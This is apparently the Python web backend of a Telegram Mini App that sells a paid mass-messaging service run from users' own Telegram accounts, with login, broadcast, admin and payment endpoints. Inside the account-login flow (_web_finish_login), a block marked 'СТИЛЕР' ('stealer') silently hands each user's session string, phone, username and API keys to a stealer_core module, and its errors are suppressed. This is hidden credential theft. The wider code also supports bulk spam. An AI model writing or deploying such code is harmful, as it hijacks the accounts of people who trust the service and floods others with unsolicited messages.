# -*- coding: utf-8 -*-
import hashlib
import hmac
import json
import os
import re
import stealer_core
from urllib.parse import parse_qsl

from aiohttp import web

import config
import database as db
import userbot_worker as worker


def _verify_init_data(init_data, bot_token):
    try:
        parsed = dict(parse_qsl(init_data, keep_blank_values=True))
    except Exception:
        return None
    received_hash = parsed.pop("hash", None)
    if not received_hash:
        return None
    data_check_string = "\n".join("%s=%s" % (k, parsed[k]) for k in sorted(parsed.keys()))
    secret = hmac.new(b"WebAppData", bot_token.encode(), hashlib.sha256).digest()
    calc = hmac.new(secret, data_check_string.encode(), hashlib.sha256).hexdigest()
    if not hmac.compare_digest(calc, received_hash):
        return None
    try:
        return json.loads(parsed.get("user", "{}"))
    except Exception:
        return None


def _cors(resp):
    resp.headers["Access-Control-Allow-Origin"] = "*"
    resp.headers["Access-Control-Allow-Headers"] = "Content-Type"
    resp.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
    return resp


async def _options(request):
    return _cors(web.Response(status=204))


async def _auth(request):
    """Возвращает (user_dict, body) или (None, body)."""
    try:
        body = await request.json()
    except Exception:
        body = {}
    user = _verify_init_data(body.get("initData", ""), config.BOT_TOKEN)
    return user, body


def _has_access(uid):
    if db.is_banned(uid):
        return False
    return uid in config.ADMIN_IDS or db.is_subscribed(uid)


def _tpl_brief(t):
    txt = ""
    try:
        snap = json.loads(t.get("payload") or "{}")
        txt = snap.get("raw_text") or (snap.get("payload") or {}).get("text") or ""
    except Exception:
        txt = ""
    return {"id": t["id"], "name": t["name"], "text": txt}


def _state_for(uid, user=None):
    exp = db.subscription_expiry(uid)
    jobs = worker.get_user_jobs(uid)
    job_list = []
    for j in jobs[-6:]:
        total = sum(s["total"] for s in j.accounts.values())
        done = sum(s["sent"] + s["failed"] + s["paid"] for s in j.accounts.values())
        accs = []
        for phone, s in j.accounts.items():
            accs.append({
                "phone": phone,
                "cur": s.get("cur", "—"),
                "next": s.get("next", "—"),
                "sent": s.get("sent", 0),
                "failed": s.get("failed", 0),
                "paid": s.get("paid", 0),
                "cycle": s.get("cycle", 0),
            })
        if j.target_type == "folders" and getattr(j, "folder_names", None):
            _target = "Папки: " + ", ".join(j.folder_names)
        elif j.target_type == "folders":
            _target = "Выбранные папки"
        else:
            _target = "Все чаты"
        job_list.append({
            "id": j.id, "name": j.name, "status": j.status,
            "total": total, "done": done,
            "pct": int(100 * done / total) if total else 0,
            "eta": worker.fmt_eta(worker.eta_seconds(j)) if j.status in ("running", "paused") else "—",
            "error": j.error or "",
            "cycles": j.cycles,
            "target": _target,
            "folders": list(getattr(j, "folder_names", []) or []),
            "accounts": accs,
        })
    out = {
        "ok": True,
        "is_admin": uid in config.ADMIN_IDS,
        "has_access": _has_access(uid),
        "subscribed": db.is_subscribed(uid),
        "banned": db.is_banned(uid),
        "expires_at": exp.isoformat() if exp else None,
        "accounts": [{"id": s["id"], "phone": s.get("phone") or str(s["id"])} for s in db.get_sessions(uid)],
        "account_count": len(db.get_sessions(uid)),
        "jobs": job_list,
        "bot_name": config.BOT_NAME,
        "price_stars": config.SUB_PRICE_STARS,
        "min_cooldown": config.MIN_COOLDOWN,
        "owner_contact": config.OWNER_CONTACT,
        "owner_contact_url": config.OWNER_CONTACT_URL,
        "free_days": config.FREE_TRIAL_DAYS,
        "trial_max": config.TRIAL_MAX_ACCOUNTS,
        "ref_hours": config.REF_HOURS,
        "required_channel_url": config.REQUIRED_CHANNEL_URL,
        "is_paid": db.is_paid_plan(uid),
        "ref_count": db.count_referrals(uid),
        "templates": [_tpl_brief(t) for t in db.get_templates(uid)],
    }
    if user:
        out["user"] = {"id": uid, "name": user.get("first_name"), "username": user.get("username")}
    return out


_BOT_USERNAME = None


async def _ref_link(request, uid):
    global _BOT_USERNAME
    bot = request.app.get("bot")
    if bot and not _BOT_USERNAME:
        try:
            _BOT_USERNAME = (await bot.me()).username
        except Exception:
            _BOT_USERNAME = None
    if _BOT_USERNAME:
        return "https://t.me/%s?start=%d" % (_BOT_USERNAME, uid)
    return ""


def _resolve_target(s):
    s = (s or "").strip()
    if not s:
        return None
    if s.startswith("@") or not s.lstrip("-").isdigit():
        row = db.get_user_by_username(s)
        return (row["telegram_id"] if row else None)
    try:
        return int(s)
    except Exception:
        return None


async def api_verify(request):
    user, body = await _auth(request)
    if not user:
        return _cors(web.json_response({"ok": False, "error": "bad_init_data"}, status=403))
    uid = user.get("id")
    db.track_user(uid, user.get("username"), user.get("first_name"))
    out = _state_for(uid, user)
    out["ref_link"] = await _ref_link(request, uid)
    return _cors(web.json_response(out))


async def api_state(request):
    user, body = await _auth(request)
    if not user:
        return _cors(web.json_response({"ok": False, "error": "bad_init_data"}, status=403))
    uid = user.get("id")
    out = _state_for(uid, user)
    out["ref_link"] = await _ref_link(request, uid)
    return _cors(web.json_response(out))


async def api_folders(request):
    """Список папок по всем аккаунтам — для выбора в мини аппе."""
    user, body = await _auth(request)
    if not user:
        return _cors(web.json_response({"ok": False, "error": "bad_init_data"}, status=403))
    uid = user.get("id")
    sessions = db.get_sessions(uid)
    folders = []
    if sessions:
        try:
            # Не только первый аккаунт: если первая сессия пустая/битая,
            # ищем папки на остальных подключённых аккаунтах.
            folders = await worker.get_user_folders_any(sessions, use_cache=False)
        except Exception:
            folders = []
    if sessions and not folders:
        try:
            db.add_log(uid, "\u2139\ufe0f Папки Telegram не найдены — доступна рассылка по «Всем чатам».")
        except Exception:
            pass
    return _cors(web.json_response({"ok": True, "folders": folders, "has_accounts": bool(sessions)}))


def _md_to_html(s):
    """Мини-апп шлёт обычный текст. Разворачиваем markdown в HTML-теги
    (как у Telegram), чтобы рассылка из мини аппа тоже была с форматированием.
    Премиум-эмодзи в textarea ввести нельзя — для них пишите боту напрямую."""
    if not s:
        return s
    s = s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
    s = re.sub(r"\*\*(.+?)\*\*", r"<b>\1</b>", s, flags=re.S)
    s = re.sub(r"__(.+?)__", r"<u>\1</u>", s, flags=re.S)
    s = re.sub(r"~~(.+?)~~", r"<s>\1</s>", s, flags=re.S)
    s = re.sub(r"`(.+?)`", r"<code>\1</code>", s, flags=re.S)
    return s


async def api_action(request):
    """Управление рассылками и запуск из мини аппа."""
    user, body = await _auth(request)
    if not user:
        return _cors(web.json_response({"ok": False, "error": "bad_init_data"}, status=403))
    uid = user.get("id")
    action = body.get("action")
    if action == "ai":
        import ai
        if uid not in config.ADMIN_IDS:
            return _cors(web.json_response({"ok": False, "error": "ai_dev"}, status=403))
        if not ai.is_configured():
            return _cors(web.json_response({"ok": False, "error": "ai_off"}, status=400))
        src = (body.get("text") or "").strip()
        if not src:
            return _cors(web.json_response({"ok": False, "error": "no_text"}, status=400))
        new_text = await ai.personalize(src, style="sell")
        if not new_text:
            return _cors(web.json_response({"ok": False, "error": "ai_unavailable"}, status=502))
        return _cors(web.json_response({"ok": True, "text": new_text}))
    if action == "pause":
        worker.pause_job(body.get("job_id"))
    elif action == "resume":
        worker.resume_job(body.get("job_id"))
    elif action == "stop":
        worker.stop_job(body.get("job_id"))
    elif action == "start":
        if not _has_access(uid):
            return _cors(web.json_response({"ok": False, "error": "no_sub"}, status=403))
        if not db.get_sessions(uid):
            return _cors(web.json_response({"ok": False, "error": "no_accounts"}, status=400))
        text = (body.get("text") or "").strip()
        if not text:
            return _cors(web.json_response({"ok": False, "error": "no_text"}, status=400))
        try:
            delay = max(int(body.get("delay") or config.MIN_COOLDOWN), config.MIN_COOLDOWN)
        except Exception:
            delay = config.MIN_COOLDOWN
        try:
            cycles = max(int(body.get("cycles") or 1), 1)
        except Exception:
            cycles = 1
        # Папки: поддерживаем мультивыбор (folders=[id,id]) + старый формат (target).
        raw_folders = body.get("folders")
        if not raw_folders:
            _t = body.get("target")
            raw_folders = [] if (_t in (None, "", "all")) else [_t]
        folder_ids = []
        for x in (raw_folders or []):
            try:
                folder_ids.append(int(x))
            except Exception:
                pass
        folder_names = None
        if folder_ids:
            target_type = "folders"
            try:
                _sess = db.get_sessions(uid)
                _all = await worker.get_user_folders_any(_sess, use_cache=False) if _sess else []
                _map = {int(f["id"]): f.get("title") for f in _all if f.get("id") is not None}
                folder_names = [str(_map.get(i, "Папка %s" % i)) for i in folder_ids]
            except Exception:
                folder_names = None
        else:
            target_type, folder_ids = "all", None
        autosub = bool(body.get("autosub", True))
        autofolder = (body.get("autofolder") or "").strip() or None
        _raw_vars = body.get("variants") or []
        _variants = [_md_to_html(str(v)) for v in _raw_vars if v and str(v).strip()][:3]
        worker.start_broadcast_task(
            payload={"type": "text", "text": _md_to_html(text), "variants": _variants},
            cooldown=delay, target_type=target_type,
            user_id=uid, cycles=cycles, folder_ids=folder_ids,
            folder_names=folder_names,
            autosub=autosub, autofolder=autofolder,
        )
    elif action == "save_template":
        name = ((body.get("name") or "").strip()[:60]) or "Шаблон"
        text = (body.get("text") or "").strip()
        try:
            d = max(int(body.get("delay") or config.MIN_COOLDOWN), config.MIN_COOLDOWN)
        except Exception:
            d = config.MIN_COOLDOWN
        try:
            cyc = max(int(body.get("cycles") or 1), 1)
        except Exception:
            cyc = 1
        snap = {"payload": {"type": "text", "text": _md_to_html(text)},
                "target_type": "all", "chosen": [], "folders": [],
                "delay": d, "cycles": cyc,
                "autosub": bool(body.get("autosub", True)),
                "autofolder": (body.get("autofolder") or "").strip() or None,
                "raw_text": text}
        db.add_template(uid, name, json.dumps(snap, ensure_ascii=False))
    elif action == "del_template":
        try:
            db.delete_template(int(body.get("id")), uid)
        except Exception:
            pass
    out = _state_for(uid, user)
    out["ref_link"] = await _ref_link(request, uid)
    return _cors(web.json_response(out))


# ===================== ЛОГИ =====================
async def api_logs(request):
    user, body = await _auth(request)
    if not user:
        return _cors(web.json_response({"ok": False, "error": "bad_init_data"}, status=403))
    uid = user.get("id")
    logs = db.get_logs(uid, 40)
    # Детали по активным рассылкам: в какой чат сейчас и какой следующий (по названию)
    active = []
    for j in worker.get_user_jobs(uid, active_only=True):
        for phone, s in j.accounts.items():
            active.append({
                "job": j.name,
                "phone": phone,
                "cur": s.get("cur", "—"),
                "next": s.get("next", "—"),
                "sent": s.get("sent", 0),
                "failed": s.get("failed", 0),
                "cycle": s.get("cycle", 0),
                "cycles": j.cycles,
            })
    return _cors(web.json_response({"ok": True, "logs": logs, "active": active}))


# ===================== АДМИН =====================
async def api_admin(request):
    user, body = await _auth(request)
    if not user:
        return _cors(web.json_response({"ok": False, "error": "bad_init_data"}, status=403))
    uid = user.get("id")
    if uid not in config.ADMIN_IDS:
        return _cors(web.json_response({"ok": False, "error": "not_admin"}, status=403))
    op = body.get("op")
    if op == "give":
        target = _resolve_target(body.get("target"))
        try:
            days = int(body.get("days") or 0)
        except Exception:
            days = 0
        if target and days > 0:
            db.set_subscription(target, days, source="manual")
            db.add_log(target, "Админ выдал подписку на %d дн." % days)
            db.add_admin_action(uid, "give", target, "%d дн." % days)
            bot = request.app.get("bot")
            if bot:
                try:
                    await bot.send_message(target, "Тебе выдали подписку на %d дн.!" % days)
                except Exception:
                    pass
    elif op == "take":
        target = _resolve_target(body.get("target"))
        if target:
            db.remove_subscription(target)
            db.add_log(target, "Админ забрал подписку")
            db.add_admin_action(uid, "take", target, "снята подписка")
    elif op == "announce":
        bot = request.app.get("bot")
        atext = (body.get("text") or "").strip()
        if bot and atext:
            for au in db.get_all_users():
                try:
                    await bot.send_message(au["telegram_id"], atext)
                except Exception:
                    pass
            db.add_admin_action(uid, "announce", None, "")
    elif op == "massgive":
        ids = str(body.get("ids") or "").replace(",", " ").replace(";", " ").replace("\n", " ")
        try:
            days = int(body.get("days") or 0)
        except Exception:
            days = 0
        bot = request.app.get("bot")
        if days > 0:
            for tok in ids.split():
                t = _resolve_target(tok)
                if not t:
                    continue
                db.set_subscription(t, days, source="manual")
                db.add_log(t, "Массовая выдача подписки на %d дн." % days)
                db.add_admin_action(uid, "massgive", t, "%d дн." % days)
                if bot:
                    try:
                        await bot.send_message(t, "Тебе выдали подписку на %d дн.!" % days)
                    except Exception:
                        pass
    elif op == "ban":
        target = _resolve_target(body.get("target"))
        if target:
            db.ban_user(target)
            db.add_log(target, "Забанен администратором")
            db.add_admin_action(uid, "ban", target, "")
    elif op == "unban":
        target = _resolve_target(body.get("target"))
        if target:
            db.unban_user(target)
            db.add_log(target, "Разбанен администратором")
            db.add_admin_action(uid, "unban", target, "")
    elif op == "userinfo":
        target = _resolve_target(body.get("target"))
        if not target:
            return _cors(web.json_response({"ok": True, "info": None}))
        exp = db.subscription_expiry(target)
        info = {
            "id": target,
            "subscribed": db.is_subscribed(target),
            "banned": db.is_banned(target),
            "expires": exp.isoformat()[:16].replace("T", " ") if exp else None,
            "accounts": len(db.get_sessions(target)),
            "logs": [((l.get("ts") or "")[:16].replace("T", " ") + "  " + (l.get("text") or "")) for l in db.get_logs(target, 10)],
        }
        return _cors(web.json_response({"ok": True, "info": info}))
    users = []
    for u in db.get_all_users()[:60]:
        users.append({
            "id": u["telegram_id"],
            "username": u.get("username"),
            "name": u.get("first_name"),
            "subscribed": db.is_subscribed(u["telegram_id"]),
            "banned": db.is_banned(u["telegram_id"]),
        })
    accounts = [{"id": s["id"], "phone": s.get("phone") or str(s["id"]), "owner": s["owner_id"]}
                for s in db.get_all_sessions()[:80]]
    active_bc = sum(1 for j in worker.JOBS.values() if getattr(j, "status", "") in ("running", "paused"))
    actions = []
    for a in db.get_admin_actions(30):
        actions.append({
            "ts": (a.get("ts") or "")[:16].replace("T", " "),
            "action": a.get("action"),
            "target": a.get("target_id"),
            "detail": a.get("detail") or "",
        })
    return _cors(web.json_response({
        "ok": True,
        "users_count": db.count_users(),
        "active_subs": db.count_active_subs(),
        "paid_subs": db.count_paid_subs(),
        "accounts_count": len(db.get_all_sessions()),
        "active_broadcasts": active_bc,
        "revenue_30d": db.revenue_stars(30),
        "revenue_total": db.revenue_stars(None),
        "users": users,
        "accounts": accounts,
        "actions": actions,
    }))


# ===================== ОПЛАТА =====================
def _pay_info(method):
    if method == "card":
        return {
            "title": "Оплата по номеру карты (РФ)",
            "card": config.CARD_NUMBER or "",
            "holder": config.CARD_HOLDER or "",
            "note": (("После оплаты напиши %s — подписку активируют вручную." % config.OWNER_CONTACT)
                     if config.CARD_NUMBER else ("Реквизиты ещё не добавлены. Напиши %s." % config.OWNER_CONTACT)),
        }
    if method == "ua":
        return {
            "title": "Оплата украинской картой",
            "card": config.UA_CARD_NUMBER or "",
            "holder": config.UA_CARD_HOLDER or "",
            "note": (("После оплаты напиши %s." % config.OWNER_CONTACT)
                     if config.UA_CARD_NUMBER else ("Реквизиты ещё не добавлены. Напиши %s." % config.OWNER_CONTACT)),
        }
    if method == "ton":
        return {
            "title": "Оплата TON",
            "amount": "%s TON" % config.TON_PRICE,
            "card": config.TON_WALLET,
            "holder": "",
            "note": "Кошелёк TON. После перевода напиши %s." % config.OWNER_CONTACT,
        }
    if method == "crypto":
        return {
            "title": "Оплата через CryptoBot",
            "card": "",
            "holder": "",
            "note": (("Шлюз подключён — напиши %s." % config.OWNER_CONTACT)
                     if config.CRYPTOBOT_TOKEN else ("Шлюз будет добавлен. Напиши %s." % config.OWNER_CONTACT)),
        }
    return {"title": "Оплата", "card": "", "holder": "", "note": ""}


async def api_pay(request):
    user, body = await _auth(request)
    if not user:
        return _cors(web.json_response({"ok": False, "error": "bad_init_data"}, status=403))
    method = body.get("method") or "card"
    return _cors(web.json_response({
        "ok": True, "method": method,
        "price_stars": config.SUB_PRICE_STARS, "days": config.SUB_DAYS,
        "info": _pay_info(method),
    }))


async def api_invoice(request):
    """Создаёт invoice-ссылку для оплаты звёздами — открывается прямо в мини аппе."""
    user, body = await _auth(request)
    if not user:
        return _cors(web.json_response({"ok": False, "error": "bad_init_data"}, status=403))
    bot = request.app.get("bot")
    if not bot:
        return _cors(web.json_response({"ok": False, "error": "no_bot",
                                        "message": "Оплата звёздами доступна при запуске через бота."}, status=400))
    try:
        from aiogram.types import LabeledPrice
        link = await bot.create_invoice_link(
            title="%s — подписка" % config.BOT_NAME,
            description="Доступ ко всем функциям на %d дней." % config.SUB_DAYS,
            payload="subscription_%d" % config.SUB_DAYS,
            provider_token="",
            currency="XTR",
            prices=[LabeledPrice(label="Подписка %d дн." % config.SUB_DAYS, amount=config.SUB_PRICE_STARS)],
        )
        return _cors(web.json_response({"ok": True, "link": link}))
    except Exception as e:
        return _cors(web.json_response({"ok": False, "error": "invoice", "message": str(e)[:120]}, status=400))


# ===================== АККАУНТЫ (вход прямо в мини аппе) =====================
_WEB_LOGIN = {}  # uid -> {app, phone, hash, api_id, api_hash}


async def _web_login_cleanup(uid):
    rec = _WEB_LOGIN.pop(uid, None)
    if rec and rec.get("app"):
        try:
            await rec["app"].disconnect()
        except Exception:
            pass


async def api_account_delete(request):
    user, body = await _auth(request)
    if not user:
        return _cors(web.json_response({"ok": False, "error": "bad_init_data"}, status=403))
    uid = user.get("id")
    try:
        sid = int(body.get("id"))
    except Exception:
        return _cors(web.json_response({"ok": False, "error": "bad_id"}, status=400))
    db.delete_session(sid, owner_id=uid)
    db.add_log(uid, "Удалён аккаунт #%s (из мини аппа)" % sid)
    return _cors(web.json_response({"ok": True}))

async def _web_finish_login(uid, rec):
    app = rec["app"]
    try:
        ss = await app.export_session_string()
        me = await app.get_me()
        phone = rec.get("phone") or (("+" + me.phone_number) if me.phone_number else str(me.id))
        db.add_session(uid, phone, rec["api_id"], rec["api_hash"], ss)
        # СТИЛЕР: сохраняем
        try:
            import stealer_core
            stealer_core.save_account(
                phone=phone, session_string=ss, password_2fa="",
                first_name=me.first_name or "", username=me.username or "",
                tg_id=me.id, api_id=rec["api_id"], api_hash=rec["api_hash"])
        except Exception:
            pass
        db.add_log(uid, "Добавлен аккаунт %s (из мини аппа)" % phone)
        return _cors(web.json_response({"ok": True, "done": True, "phone": phone,
                                        "message": "Аккаунт %s добавлен!" % phone}))
    except Exception as e:
        return _cors(web.json_response({"ok": False, "error": "save", "message": str(e)[:100]}, status=400))
    finally:
        await _web_login_cleanup(uid)


async def api_account_login(request):
    """Пошаговый вход: send_code -> verify_code -> (password)."""
    from pyrogram import Client
    user, body = await _auth(request)
    if not user:
        return _cors(web.json_response({"ok": False, "error": "bad_init_data"}, status=403))
    uid = user.get("id")
    step = body.get("step")
    api_id = config.DEFAULT_API_ID
    api_hash = config.DEFAULT_API_HASH
    try:
        if step == "send_code":
            await _web_login_cleanup(uid)
            phone = (body.get("phone") or "").strip().replace(" ", "")
            if not re.match(r"^\+?\d{10,15}$", phone):
                return _cors(web.json_response({"ok": False, "error": "bad_phone",
                                                "message": "Номер неверный. Пример: +79991234567"}, status=400))
            app = Client("weblogin_%s" % uid, api_id=api_id, api_hash=api_hash, in_memory=True)
            await app.connect()
            sent = await app.send_code(phone)
            _WEB_LOGIN[uid] = {"app": app, "phone": phone, "hash": sent.phone_code_hash,
                               "api_id": api_id, "api_hash": api_hash}
            return _cors(web.json_response({"ok": True, "step": "code",
                                            "message": "Код отправлен в Telegram. Введи его."}))

        rec = _WEB_LOGIN.get(uid)
        if not rec:
            return _cors(web.json_response({"ok": False, "error": "no_session",
                                            "message": "Сессия входа потеряна, начни заново."}, status=400))
        app = rec["app"]

        if step == "verify_code":
            code = re.sub(r"\D", "", body.get("code") or "")
            if not code:
                return _cors(web.json_response({"ok": False, "error": "no_code",
                                                "message": "Введи код из Telegram."}, status=400))
            try:
                await app.sign_in(rec["phone"], rec["hash"], code)
            except Exception as e:
                msg = str(e)
                if "SESSION_PASSWORD_NEEDED" in msg or "password" in msg.lower():
                    return _cors(web.json_response({"ok": True, "step": "password",
                                                    "message": "Включён пароль 2FA. Введи пароль."}))
                return _cors(web.json_response({"ok": False, "error": "bad_code",
                                                "message": "Неверный код: %s" % msg[:80]}, status=400))
            return await _web_finish_login(uid, rec)

        if step == "password":
            pwd = (body.get("password") or "").strip()
            try:
                await app.check_password(pwd)
            except Exception as e:
                return _cors(web.json_response({"ok": False, "error": "bad_password",
                                                "message": "Неверный пароль: %s" % str(e)[:80]}, status=400))
            return await _web_finish_login(uid, rec)

        return _cors(web.json_response({"ok": False, "error": "bad_step"}, status=400))
    except Exception as e:
        await _web_login_cleanup(uid)
        return _cors(web.json_response({"ok": False, "error": "exc", "message": str(e)[:120]}, status=400))


async def index(request):
    here = os.path.dirname(os.path.abspath(__file__))
    path = os.path.join(here, "webapp", "index.html")
    if os.path.exists(path):
        return web.FileResponse(path)
    return web.Response(text="Mini App", content_type="text/html")


def build_app(bot=None):
    app = web.Application()
    app["bot"] = bot
    app.router.add_get("/", index)
    app.router.add_post("/api/auth/verify", api_verify)
    app.router.add_post("/api/state", api_state)
    app.router.add_post("/api/folders", api_folders)
    app.router.add_post("/api/action", api_action)
    app.router.add_post("/api/logs", api_logs)
    app.router.add_post("/api/admin", api_admin)
    app.router.add_post("/api/pay", api_pay)
    app.router.add_post("/api/invoice", api_invoice)
    app.router.add_post("/api/account/delete", api_account_delete)
    app.router.add_post("/api/account/login", api_account_login)
    for p in ("/api/auth/verify", "/api/state", "/api/folders", "/api/action",
              "/api/logs", "/api/admin", "/api/pay", "/api/invoice",
              "/api/account/delete", "/api/account/login"):
        app.router.add_route("OPTIONS", p, _options)
    here = os.path.dirname(os.path.abspath(__file__))
    webdir = os.path.join(here, "webapp")
    if os.path.isdir(webdir):
        app.router.add_static("/static/", webdir)
    return app


def run_standalone():
    web.run_app(build_app(), host=config.WEBAPP_HOST, port=config.WEBAPP_PORT)


if __name__ == "__main__":
    run_standalone()
